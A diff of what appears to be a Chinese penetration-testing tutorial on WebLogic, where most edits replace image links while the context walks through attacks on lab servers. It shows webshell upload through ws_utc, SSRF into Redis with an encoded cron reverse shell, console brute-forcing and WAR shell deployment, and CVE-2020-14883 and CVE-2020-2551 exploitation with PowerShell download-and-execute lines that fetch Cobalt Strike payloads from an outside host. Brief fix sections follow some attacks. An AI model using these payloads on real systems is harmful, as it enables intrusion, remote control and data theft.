+![](../../.resource/remote/505403fcfcd411ee17116c9b0e504adcc853b30375aa09ec504895600d90a408.png)
 
 把 Weblogic 修改为开发模式后，访问 / ws_utc/begin.do 界面
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibiaZMpbSbvVOpgXjkk3VQylhzcfy88Ab8m7VMCnOibwD7uZ4hhhZRgbeA/640?wx_fmt=png)
+![](../../.resource/remote/5c34c81b377e863f07b4d34584a9cff7b43cf904f9de4dcf051d892d3a8abe73.png)
 
 成功找到文件上传点，在其中直接上传文件
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAib6VJhdV49N0FfzEIFT0ThUmiby9RXq98d49mpSsjGO9xQppzibBhXfY9g/640?wx_fmt=png)
+![](../../.resource/remote/f248380a4b43851ca3d2a9948c139a7f149c3daf28df7c042706a02fd3f20d43.png)
 
 抓包后发现其中存在安全配置，虽然在返回包中能看到相应的路径，但是无法访问，当然这里其实是可以上传的，在后面 vulhub 中的实例会解答
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibziae4Xwkgo9tibx76ibIgbM3pynqCDvPLwHo2wupTd2ouanZho01iaPJGA/640?wx_fmt=png)
+![](../../.resource/remote/075b5350e3637000f60a60f22c076bfada97ff31831e2d93f5447407f916a8f5.png)
 
 进入 / ws_utc/config.do 界面
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibEYh5kpfXm6wPtj9yjRaa81R2kVByBicybicATeBEb7FAA0k66C65HxQw/640?wx_fmt=png)
+![](../../.resource/remote/b95f3b17347d9dde4db8c751d4ce550af81f94162f6b14e6dca91e73e42b8013.png)
 
 将当前文件目录修改为
 
 C:\Oracle\Middleware\Oracle_Home\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\com.oracle.webservices.wls.ws-testclient-app-wls_12.1.3\cmprq0\war\css 后提交
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibQ3zZmibicjRCVvEawwSLbehztuicTk2CksD9vYyp49VQOnKaUL3s5Vqaw/640?wx_fmt=png)
+![](../../.resource/remote/43392d12add49b4a107e1250122e191fa5d52116d77e7946b30a3e2bbb82808f.png)
 
 **在安全选项中点击添加并选择木马尝试上传**
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibqCqJ0SibUaPvRTEQ9rKBxzHHUnfTxeOyXkbDZ4qohPrBtCPSIXUZBcA/640?wx_fmt=png)
+![](../../.resource/remote/2a9eaab068c07ff31fff9264c8108b96f9f65b8ff1e7e5a434510d4bced75d4b.png)
 
 提交后查看页面源码，成功发现其中的 id，它对应的其实就是时间戳
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibV6mjw6rNYCkQPAW05fQjbcNeqAy6TXPC9DgWxSV9ae9K5ukpnczeicQ/640?wx_fmt=png)
+![](../../.resource/remote/911ff74e48804b79f6ef44d881bc221843b57e3ff0c0c49d0f3606650ba1f414.png)
 
 把这个 id 与木马原名称拼接，访问
 
 /ws_utc/css/config/keystore/1638725748360_JspSpy.jsp 成功
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibb663gg6K17tyPbHlxmibKPWoaZklBVvOvOpeRs0UUqOjsDtZLM9PkgA/640?wx_fmt=png)
+![](../../.resource/remote/96c2b79bf137d288a3a7f8036001cfb20a8db6ad043fcc8193cde8fbfd2142e3.png)
 
 输入密码 ninty，进入木马管理界面
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibUGwjfuFRyvIw0hRMXnurb9yTcKZ4wGLeg4ygWxuPQ2vBsox0FDu45Q/640?wx_fmt=png)
+![](../../.resource/remote/074f129e781c36c60517019accc7d3fdb24f8fc84141501e4ff2daad5e90b035.png)
 
 接下来测试 vulhub 环境，其中 Weblogic 的密码为 EfWP0enw，如果不知道可在靶机中运行如下命令：
 
@@ -919,19 +919,19 @@ sudo docker-compose logs | grep password
 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAib0EiaR3GbckkyW990OazWoHen3pSZBmnC0V4eFcyzz5zajFDlFKFrVlg/640?wx_fmt=png)
+![](../../.resource/remote/2a6e54579148d928e4dd46eb1a232655700662509c717116eee5f51f40a04d47.png)
 
 进入控制台后还是和之前一样开启 web 测试页
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibiaoR3g0iam0HwDuGmW4pn4Iwhmb5y1nnDSYuN3EE9J4CicvY7KMMm1tVg/640?wx_fmt=png)
+![](../../.resource/remote/667c20f87e4818e8473eba9c22e0b7f966deda201bf51041f1f77c232bf9002c.png)
 
 保存后访问 ws_utc/begin.do，在其中上传木马
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAib2FlVjfB2fOfGDahs943ebSA5l1ia0qvQLxEAdEF8XPSlC2AU9E6P3tg/640?wx_fmt=png)
+![](../../.resource/remote/bfc283189e0dff9fa99c7895855e9a40973278e5f7c9dc83b065c66090d42922.png)
 
 使用 BurpSuite 成功抓取到文件上传数据包如下：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibZjeUw563MxA7pwkhu26ZWcwGRcUV2QbNOcQVGuDWJvZJckP41jXeUQ/640?wx_fmt=png)
+![](../../.resource/remote/cc0ae9b143021542550ba6f0ee30b582cea96076bf41810124c9802d39a62d6b.png)
 
 虽然显示 500 错误，但是在响应包中存在路径 / ws_utc/css/upload/RS_Upload_2021-12-05_18-22-05_785/import_file_name_JspSpy.jsp，还是出现和上面一样的问题，但其实我们只需要设置上传路径即可解决这个问题。进入 / ws_utc/config.do 界面，设置当前工作目录为
 
@@ -940,11 +940,11 @@ sudo docker-compose logs | grep password
 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibOdea9AqsiahiaR1YdEo88oycsmmbtDm9QTINwX8ASiay9IW4MHZ2mmOAg/640?wx_fmt=png)
+![](../../.resource/remote/b8fa35cfa78ba2ce39be9b494a57c23af2d211d991010ef514012c88ae83e6cb.png)
 
 重发木马上传请求包，在响应中返回路径发生变化
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibF0M6NL1cy8YQ129kwjFvc0K5KqFAo2z4ia4gKicic38VbwVGkribodesibw/640?wx_fmt=png)
+![](../../.resource/remote/d419038af0941854c0ca3831247fc3738dd49d7e617e9708712526326911e4e7.png)
 
 该路径就是 config.do 界面中设置的工作目录，访问
 
@@ -955,19 +955,19 @@ sudo docker-compose logs | grep password
 
 发现木马已存在
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAib1zZTvOrA3qzpoIibQFZibjJ7ve7kmnJ4GdDFoBtJttcHxmJfzPyYEib3w/640?wx_fmt=png)
+![](../../.resource/remote/b988b78ebf682704ce4bc1f47ce18d8375a7406ce40011d2efc4a65af35d72f2.png)
 
 而 config.do 的利用与以上 Windows 环境一样，在安全中设置 keystore 并点击提交
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAib5aJLHPTjOJNwicQ0SDbcTgCwZrIwrxX43OJLwAv8d6AOPicDoOUVRblw/640?wx_fmt=png)
+![](../../.resource/remote/506dfa6b486122a4ac55cfa5bb66b5b4218b642b4196614f52624876aa803ee3.png)
 
 查看页面源代码找到对应 id
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibBq7PFogwBlicTGKY7VArrAPkYnKQOfPyo0Elfp5xmqJwl78NXVoB8Fw/640?wx_fmt=png)
+![](../../.resource/remote/6d9c7026238a74f5904d782cbec25073f929fd9dfbd16efc0d732457f010f16d.png)
 
 访问 / ws_utc/css/config/keystore/1638727126207_JspSpy.jsp，成功 getshell
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibfD0kHbb0jbMianaPc91wiaM68yicUtyicUpuIYuiccKEvoXXjCO2h8ib5k7A/640?wx_fmt=png)
+![](../../.resource/remote/0185d20cae057b6c32580736013ff678d6fd076ee5274409f53ea398193c9ca1.png)
 
 **漏洞修复**
 
@@ -995,23 +995,23 @@ WebLogic 的 SearchPublicReqistries.jsp 接口存在 SSRF 漏洞，如果服务�
 
 验证漏洞只需要直接访问 / uddiexplorer / 接口，出现如下界面说明漏洞存在
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAib9QuUMSuTf0KwibF9YoxTichDTXGEKs6NoAJib9ib6asPPyag9ZVRwiazbEQ/640?wx_fmt=png)
+![](../../.resource/remote/793ff9d12747e81db45e46768eff15989156a4cdac19e28cf5188e3f50443846.png)
 
 为了方便验证 SSRF 漏洞，把环境切换至 vulhub 当中，其自带 redis 未授权访问漏洞。存在漏洞接口为 Search Public Registries
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibFZ9YYHcurdeiaxnJYwNvu37cOibbc7ESPQKHPpwCVTsdBGqMeiaNJXpKw/640?wx_fmt=png)
+![](../../.resource/remote/8d8cfe38f24f08f0781c0fe32f21265a80b741a97a6d25ec49ea83f889ba7a8e.png)
 
 点击 Search 通过 BurpSuite 抓取数据包
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibxeF7uXdLIJcwlicLrdVkjYv7m6B5cTpia188Rl53UtFXrrChXUh5J20A/640?wx_fmt=png)
+![](../../.resource/remote/3204b1c214b90a697419972bb3d5113e4dbb7f7b4e116f42c9889d9df785c385.png)
 
 更换请求方式为 GET，在漏洞点 operator 中设置一个不存在的端口，比如 http://127.0.0.1:80
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibk6W5jnSBW8vT3ppRwQbw0VTibpljZkCr9OLHpiaTbGQlVgw7kqNJBR3Q/640?wx_fmt=png)
+![](../../.resource/remote/7215c2d77f6135d7b24d6fadc021189bcbf99d1ebc86d0e36f0dde520992dae6.png)
 
 果不其然响应包显示存在错误，接下来在漏洞点 operator 中设置一个存在的端口，比如 http://127.0.0.1:7001
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibOLibY4IylnULQPAlRkGTAJGYSQ5bia5eahiaruzlFD6huKLxRl6u1cGgg/640?wx_fmt=png)
+![](../../.resource/remote/66d1cdaf26015c5eb588171782e43d8f972405a71327cd9f9bea4856aa94e3c9.png)
 
 响应包显示访问状态码 404，说明端口开放和关闭的响应结果有所不同。因此可根据相应内容判断目标的端口服务是否开放，从而利用 SSRF 进行攻击。
 
@@ -1019,7 +1019,7 @@ WebLogic 的 SearchPublicReqistries.jsp 接口存在 SSRF 漏洞，如果服务�
 
 探测内网是否存在 redis 服务，修改漏洞点路径为 http://172.24.0.2:6379
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibv60FD9Iib5pPbhVNBaB7pwhuLJv3PJtINb6K09hDMSz4kbqeKia23P2Q/640?wx_fmt=png)
+![](../../.resource/remote/fef4aa4b3f3661501c2c017eaacde3a3891ea98617b0dfeb915124989c7a07f6.png)
 
 出现与以上两种都不同的提示，说明端口是开放的，但使用的协议不是 http，因此在 172.24.0.2 中开放着 Redis 服务，尝试写入计划任务执行反弹 shell
 
@@ -1037,7 +1037,7 @@ set%201%20%22%5Cn%5Cn%5Cn%5Cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%
 
 放到漏洞点当中，注意在前面和后面分别添加 %0D%0A%0D%0A 来实现 HTTP 头 CRLF 注入
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibELKzDUKQmACiaANkIY4ZcptqpgQjfbSOrDuFHbiakicECP84Ge1ZEbAibg/640?wx_fmt=png)
+![](../../.resource/remote/abcdbcebc4b836936fc77ff594f9eff91883bb633803f910948177cf839f6a52.png)
 
 完成后可进入靶机进行查看，在 docker 中查看容器 ID
 
@@ -1046,7 +1046,7 @@ docker ps
 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibgibcKibPFiatNic7bGbjKrt20Vg23hH0XW7equlqj3MCaSluicEWwQqddibg/640?wx_fmt=png)
+![](../../.resource/remote/24f28461a650b7d9ee10f7ba9c12cd0338530c7c22166b89602b2d7868ca6b50.png)
 
 发现 c6f7 开放 Weblogic 服务，其 IP 地址为 172.24.0.2；而 7704 开放 redis 服务，其 IP 地址为 172.24.0.3，进入 7704 查看计划任务
 
@@ -1057,7 +1057,7 @@ cat crontab
 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibWs4zSFWTAjff7aLzu04RNatiapn17GNd59WAyoKh2x4g2MvnD4GAN5A/640?wx_fmt=png)
+![](../../.resource/remote/1b7315163edb7caba3dbbe8ce7d1baae1d98fd30753567342f5a5fd2eea10e1c.png)
 
 发现计划任务已经写入，在本机（172.24.0.1）中开启 nc 监听可成功收到反弹 shell
 
@@ -1066,7 +1066,7 @@ nc -nvlp 6666
 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAib2jF4NAU9JibhiaKiaq8Uy5TITUgm5HmFAicw2C3Z9QbBdYR9M22BXezWyQ/640?wx_fmt=png)
+![](../../.resource/remote/349bb68e50d90e222aa67abe403ab4cb15e919fb85b1df28393e73dbfeca80c7.png)
 
 **计划任务写入技巧：**
 
@@ -1088,29 +1088,29 @@ nc -nvlp 6666
 
 利用爆破手段拿到控制台密码，在爆破时注意如果存在特殊字符需进行 URL 编码
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibIx1wSwRyRFsJSCkicCeJ0PgJHy7tSgyicypP9nTicURdzbkYzOUxfM4QA/640?wx_fmt=png)
+![](../../.resource/remote/079176e1295f1282eebf349f67caafc02df9d9de697b1b26918aed178cb42108.png)
 
 在控制台中找到部署选项，开始上传 war 包
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAib6pSzkNXJiaShLGib139vWCib5Hw1rdoia8A1VyMLfK1hXjMDcCzbGytkXQ/640?wx_fmt=png)
+![](../../.resource/remote/e4109bfdbf939626a469d00f46f794add9d0afd7914500c068e9e98a44a72e38.png)
 
 选择文件进行上传，一直下一步直到完成上传
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibwjHZYwEtGzYLKtvB7b3GRXrnOIl8Q037DRma4nwlbXz4icolyawonVQ/640?wx_fmt=png)
+![](../../.resource/remote/0ac29ea4c5c0a53c2c0d32eaccb68137467a8c1680383f285289e0b9bc08d43b.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibv3bkoK24NaVLPQuUIjEDibiarPCrRlZjFG6Ps5jicqJeXMgseib4KZJIibA/640?wx_fmt=png)
+![](../../.resource/remote/83c448664a5c225fc46e07d77039ae66b44aa57bfc571603b6d74d74a9152b5a.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibGGmbiaWWbRiaZuSV3iaUhpM8fVX7hlqebKiahP9EgWPM9RDtNvVQATsqug/640?wx_fmt=png)
+![](../../.resource/remote/379f5bbbb0ddd5a77b0f224b6fb94987e6ebac10a72517bc3156098bf5c05db4.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibpUibpuD2P3CwyE8KEfUrU6KG65TfYa10oagoibfzm6UZVSp1Ydyibw2xg/640?wx_fmt=png)
+![](../../.resource/remote/86dfc285cc6b68a97a81032e06d4bf0f9f46f0df26ec77b95a3360ee849de8dc.png)
 
     部署成功后存在该应用并点击启动
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibibGGSj6SpoEVtINRCUWB4FY14xiaRufeWmhCZgmQicPZmTP6uHwAK6N6w/640?wx_fmt=png)
+![](../../.resource/remote/1e36dc3ca234c1b4eaf2d9fc37e556f91b5ed9389582e0cb4eee59dca8550339.png)
 
 访问木马 http://192.168.0.105:7001/JspSpy/JspSpy.jsp 成功
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibibVHgRHZxFMGBqcmibpxqYbqLibpvQO3o3qc4IXmTGCkxbicPyRjojia0gA/640?wx_fmt=png)
+![](../../.resource/remote/8ee9a3d0bd844fe14478edf1418686d8db10912d4851370e376a749e0b5dd3ec.png)
 
 **漏洞修复**
 
@@ -1148,7 +1148,7 @@ docker-compose up -d
 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibzFGTlCPczQibJN8TCZD05aRRzyvOEIQtvQ5eH4fV002QAPfEiba3U4yg/640?wx_fmt=png)
+![](../../.resource/remote/7fd3c08df49f2c5a975eb749eba53b83961f25248efa2fe108e237609d9ceed8.png)
 
 而 CVE-2020-14883 的 POC 如下，执行后可写入文件至 Weblogic 服务器当中，执行后显示 404
 
@@ -1157,11 +1157,11 @@ docker-compose up -d
 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibXfLAowg7NjTMHy99bQasdaO6sv6bEN65z9RXoCY6rKp3TL4kGng4tA/640?wx_fmt=png)
+![](../../.resource/remote/61fbc5eb97527a79b0661caf502ce77ef85ca6b752c1002d342776c70cdf04d2.png)
 
 在服务器中查看发现文件已成功写入 / tmp 目录
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibxZtNRMBrTkjehBicxsQLI7qo7REuSy9W7VPMyHZ7VIomPzyoYJDmJeg/640?wx_fmt=png)
+![](../../.resource/remote/0ff2307aafabbf4b877e7a42699a31a557a0d702ebb1920cf585f4d3416a00f9.png)
 
 **Linux 反弹 shell**
 
@@ -1196,11 +1196,11 @@ python -m SimpleHTTPServer 80
 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibhIoBjrF4zohONASQXkER2w0evwpy1Yo6SjAhVQo90wictwpicup6nxvA/640?wx_fmt=png)
+![](../../.resource/remote/2984e9ce56dd1aa5aa237cfa5df02ce9889ba33fd6c8126b3ce2232049d3fb39.png)
 
 成功拿到反弹 shell
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibic1bJPdMBd5QVoeW3HG4qkZAL6fZ0iaWXCaqVxekicsgUI8kFicK0T8xKw/640?wx_fmt=png)
+![](../../.resource/remote/0319bf3fc6d007efbe6e7cac7d7bda419624603e64568c5974057bc19d14c83d.png)
 
 **Windows 上线 CS**
 
@@ -1228,11 +1228,11 @@ python -m SimpleHTTPServer 80
 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibS1ia9fJA7UII45oZTh17BYDj5QARMwwSQr0xPnd7ZEmckdAzXlsLTbA/640?wx_fmt=png)
+![](../../.resource/remote/db8b92f37de9a437370ff03ef7e1fd7e562c98f79394ee5b1d5fb4733a2f5c0c.png)
 
 在 Windows 系统中成功弹出计算机
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibrJL219RLYzA07Rib09VVMd6zTbU8m0LcY4ISKOoQvdAialsMOSib9Ljicg/640?wx_fmt=png)
+![](../../.resource/remote/f256a2b703f159f6eb07da56070a7ab95d2a26c962c25df39711a32f70765f93.png)
 
 既然可以执行普通程序，那么上线 CS 自动也没什么问题，修改利用请求如下：  
 
@@ -1253,7 +1253,7 @@ python -m SimpleHTTPServer 80
 
 执行后成功上线 CS，但默认会执行多次程序，从而导致上线多个会话
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAiblnDH7BXwhZeTJkcfOx1mpqbNBj2EWTN6UsvrHUBHOGy1iagvCQytMHQ/640?wx_fmt=png)
+![](../../.resource/remote/10199700e5bd2d772267e2c593ac958d559f6344c06d97d93d08b7e4fef00245.png)
 
 **漏洞修复**
 
@@ -1271,7 +1271,7 @@ python -m SimpleHTTPServer 80
 
 利用该漏洞需要准备如下四个文件：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibJTqrLVHicHAatvbiboEjKkwtZJiacSiaE9HbC5W5cXPgIREMYsDIEhIT3Q/640?wx_fmt=png)
+![](../../.resource/remote/4e61ee70b12d728c18f2fe31fbcabe306803a343845fcd96bd776a1d70ed6724.png)
 
 在 exp.java 中发现其调用计算器程序
 
@@ -1304,7 +1304,7 @@ java -version
 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibOnCicyl1MGzNAnyLteeicqEvssV63ku4DFXFRSkcNwib4ibHGib0vfTNXLQ/640?wx_fmt=png)
+![](../../.resource/remote/36fbbc8238a67c792d42e32fc089725958a3ce65a9c5f1d25e90714a08a8f4f1.png)
 
 编译 exp.java 后在当前目录启用 http 服务
 
@@ -1316,7 +1316,7 @@ python3 -m http.server 80
 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibHJtLhO3DDTsJrAEaAcVA9Z1PNCj8VIib07jSJN9rY3PicRrMNcxGxKJg/640?wx_fmt=png)
+![](../../.resource/remote/a33347077295bd6314a163baf6f81553513c50085a91efc521ac3581ac53d7a8.png)
 
 通过 maeshalsec 启动恶意的 RMI 服务，开放端口为 1099
 
@@ -1325,7 +1325,7 @@ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://
 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAib9pmeUSpUwaHyhKeZqhybMFJXoQEoL60hKpapmVfibu9XFjObtYTNMKQ/640?wx_fmt=png)
+![](../../.resource/remote/c0eb9386c6f344f74a227f8d540d5a6ca6256b31edf72bb7fd0dedafcb7ca16b.png)
 
 执行漏洞利用脚本请求 RMI 服务进行攻击
 
@@ -1334,11 +1334,11 @@ java -jar weblogic_CVE_2020_2551.jar 192.168.0.105 7001 rmi://192.168.0.50:1099/
 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAib8GHTjkJ0Bdc7DxPVnUsQ1QYuSXicuEepmMKnkTveiaaIiarC93duey1Hg/640?wx_fmt=png)
+![](../../.resource/remote/31d07d1472053a9b5adcdc59a2329f19ef78829246a70c9086058628e65403cb.png)
 
 成功在 10.3.6 版本的 Weblogic 服务器中弹出计算器
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibmT5IFvFriaUsbFDUmHPKAjKA0lfCC3atOJLVREk0PjGZ4IyOuIN0DGw/640?wx_fmt=png)
+![](../../.resource/remote/6f6ef37c525c080ba5666b631ac53d8d6ec8241bb3489011e10e9128010f47b1.png)
 
 接下来测试 12.1.3 版本的 Weblogic 是否存在该漏洞，执行漏洞利用程序进行攻击
 
@@ -1347,11 +1347,11 @@ java -jar weblogic_CVE_2020_2551.jar 192.168.0.111 7001 rmi://192.168.0.50:1099/
 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAib6yicXAJC6yjQia6GcXv1x8NicOa3j3d4eMXmsXpjAqMPlkdfvlEMe55bA/640?wx_fmt=png)
+![](../../.resource/remote/a7ad82fa7d2ceae7628f98ae91c7a419f9a0867583a25959e4fa4cdfa4f2e68a.png)
 
 同样在服务器上弹出计算器，说明在 12.1.3 版本中也存在该漏洞
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibjCy5cJZgrIPqC78IROH44oGpibC27Gs9icktibhIAOpnSLNPXIXOAiaykA/640?wx_fmt=png)
+![](../../.resource/remote/e0fec0ddf433ca002d4ba79b4f245f6eeed88d8dbcc5bb9f20873cbccf14fed8.png)
 
 把 exp.java 中执行的计算器程序修改为 CS 木马程序
 
@@ -1360,7 +1360,7 @@ java.lang.Runtime.getRuntime().exec(new String[]{"powershell","/c","(new-object 
 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAib95Zr7MTicUqZ7q3avLd2wLpkyQ7m9y7k4x4VrxNI7ibY3crXgiacGLPyQ/640?wx_fmt=png)
+![](../../.resource/remote/48f81e1b85c54b34ff5f83e9139f2ad45c725247ba7444a94393b25d8a12980b.png)
 
 使用 javac 再次编译 exp.java 并开启 http 服务
 
@@ -1370,7 +1370,7 @@ python -m SimpleHTTPServer 80
 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibLsKvCfbmjxXfKXo1Ltichic7Yl6Gj51zeTibBNmWU8UwYD2EbcdU1Veicw/640?wx_fmt=png)
+![](../../.resource/remote/c449d2f95f7b9cb33d076d7937b9834a8ea13541501c423c9cfdd1e082d38349.png)
 
 执行漏洞利用程序请求恶意 RMI 服务
 
@@ -1381,7 +1381,7 @@ java -jar weblogic_CVE_2020_2551.jar 192.168.0.105 7001 rmi://192.168.0.50:1099/
 
 成功执行木马并上线 CS
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAib1voPKtCke9wj9gNpqWJjmNTWyBnKutbBkBuvtKnnkrf9UELXPSaVVQ/640?wx_fmt=png)
+![](../../.resource/remote/ce3b68e56d71d63786815335cc7c3024bb241dbb18e34ad97cc9a5bb02050e4a.png)
 
 当然也可以使用 powershell 命令来替代，同样能够上线 CS
 
@@ -1410,7 +1410,7 @@ IEX (New-Object System.Net.Webclient).DownloadString('http://www.naturali5r.cn/p
 
 /console/css/%252e%252e%252f/consolejndi.portal，如果出现以下页面说明可未授权访问
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibgCyKwXsLibbg3VrZEsWrSpY41xS1FZiauZRj9EFSVyibUoBicn5V2rthkw/640?wx_fmt=png)
+![](../../.resource/remote/6dc1f429b3e2805c4ce869dea6d29b128f58839d892120e581b8173c7206b60e.png)
 
 启动攻击所需要的 LDAP 利用脚本，其中 - i 指向当前服务器 IP 
 
@@ -1426,7 +1426,7 @@ java -jar JNDIExploit-v1.11.jar -i 192.168.0.106
 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAibibq8dTdWYRuwBfuLt5vyEYWwibxK3YRiadQP3PQbOjw930VLPhriaJgzZg/640?wx_fmt=png)
+![](../../.resource/remote/a38e8c858f652373e48a390905fafff2b58fa1e13ab8cf5690395d88d8426211.png)
 
 配合 Weblogic 未授权验证远程代码执行漏洞是否存在，验证成功返回用户名
 
@@ -1435,7 +1435,7 @@ java -jar JNDIExploit-v1.11.jar -i 192.168.0.106
 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/pH5fZ5lvwwZ8ZiaV8URgFKibTibsnZuIfAib5xZYbTtHnnpSaCJTKeBUKDwd59j0UyhqrT4LI0aLhGQNFlWibWFgvBQ/640?wx_fmt=png)
+![](../../.resource/remote/31ffd06188699c8f6b695b4e57867ed279b6f81cee79a46fd7ea75e9ac01f537.png)
 
 修改 cmd 请求头命令如下，尝试上线 CS
 
@@ -1444,21 +1444,21 @@ powershell /c (new-object System.Net.WebClient).DownloadFile('http://192.168.0.1
 
 ```
 
